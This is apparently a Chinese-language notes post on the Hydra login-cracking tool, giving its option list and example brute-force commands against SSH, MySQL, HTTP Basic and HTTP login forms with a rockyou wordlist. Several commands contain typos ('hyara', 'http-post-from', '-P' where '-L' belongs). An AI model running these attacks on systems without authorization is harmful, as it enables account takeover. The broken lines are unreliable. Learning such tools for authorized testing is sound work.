---
title: Tools-hydra
author: AmtuOrRF
categories: [tools]
tags: [tools]
---

#help
一个非常快速的网络登录破解程序，支持许多不同的服务
```bash
选项：
  -R 恢复以前中止/崩溃的会话
  -我忽略现有的还原文件（不要等待 10 秒）
  -S 执行 SSL 连接
  -s PORT 如果服务位于不同的默认端口，请在此处定义
  -l LOGIN 或 -L FILE 使用 LOGIN 名称登录，或从 FILE 加载多个登录
  -p PASS 或 -P FILE 尝试密码 PASS，或从 FILE 加载多个密码
  -x MIN:MAX:CHARSET 密码暴力生成，输入“-x -h”获取帮助
  -y 禁止在暴力破解中使用符号，见上文
  -r 对选项 -x 使用非随机洗牌方法
  -e nsr 尝试“n”空密码，“s”作为通过登录和/或“r”反向登录
  -u 循环用户，而不是密码（有效！隐含在 -x 中）
  -C FILE 冒号分隔的“login:pass”格式，而不是 -L/-P 选项
  -M FILE 要攻击的服务器列表，每行一个条目，':' 指定端口
  -o FILE 将找到的登录名/密码对写入 FILE 而不是 stdout
  -b FORMAT 指定 -o FILE 的格式：text(default), json, jsonv1


-l admin	指定用户名
-p 12345	指定密码
-L user.txt	指定用户名字典
-P pass.txt	指定密码字典
-vV			显示过程信息
-t 10		线程 最大 64
-s 22		指定服务端口
-S			使用SSL协议连接
-R 			根据上一次进度继续破解
-C user:pass
-e <ns>		n空密码试探
-w <time>	超时
```


## hydra 使用示例

### 语法
```bash
hyara -l admin -p 123456 ssh://IP
hydra IP telnet -l admin -P pass.txt -vV
hydra IP telnet -P user.txt -P pass.txt -vV
hydra IP telnet -l admin -P pass.txt -vV -t 10
```


### 爆破ssh服务
暴力破解 Window ssh 服务 10个线程
```shell
hydra -l Administrator -P rockyou.txt ssh://172.16.1.200 -t 10
```

### 爆破运行在33060端口的mysql服务
-s 指定端口
```bash
hydra -l root -P rockyou.txt mysql://172.16.1.200 -s 33060 -t 10
```



### http-Basic
```bash
hydra 10.0.1.101 http-head "/development" -l admin -P pass
# Authorization: Basic
```


### http-post
```bash
# 查看帮助信息
hydra http-post-form -U

hydra IP http-form-post "/from/fromtpage.php:usr=admin&pwd=^PASS^:INVALID LOGIN" -l admin -P rockyou.txt -vV -f

hydra IP http-post-from "/login.php:uname=^USER^&pass=^PASS^:fales" -l admin -P rockyou.txt -f -vV
```

http登录暴力破解-判断成功/失败
```python
"login.php:user=^USER^&pass=^PASS^:S=logout"
# S 登录成功后才有的字符串
# 可能登录成功后的页面有 logout 字符串

"login.php:user=^USER^&pass=^PASS^:F=error"
# F 登录失败时才有的，成功则没有
```

